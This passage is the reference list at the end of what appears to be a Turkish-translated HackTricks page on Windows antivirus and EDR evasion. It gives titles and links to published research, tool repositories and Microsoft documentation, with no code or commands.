- [12] [Check Point Research – ToolShell'den önce: Storm-2603'ün önceki ransomware operations'ını incelemek](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Forwarded Exports'ı kötüye kullanmak](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light (PPL) desteğiyle EDR'lara karşı koymak](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect Technique ile Windows Defender'ın protective shell'ini kırmak](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Pure Curtain'ın altında: RAT'ten builder'a, builder'dan coder'a](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer şehre geliyor: Yeni ve iddialı bir infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: API Tracing ile Node.js malware'ını etkisizleştirmek](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Adaptix'i Crystal Palace ile uykuya yatırmak](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET ve Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet Etw'nizi gizlemek](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [Sleeping Beauty: Red Team Operations'ta Chrome Remote Desktop'ı kötüye kullanmak için pratik bir rehber](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
{{#include ../banners/hacktricks-training.md}}
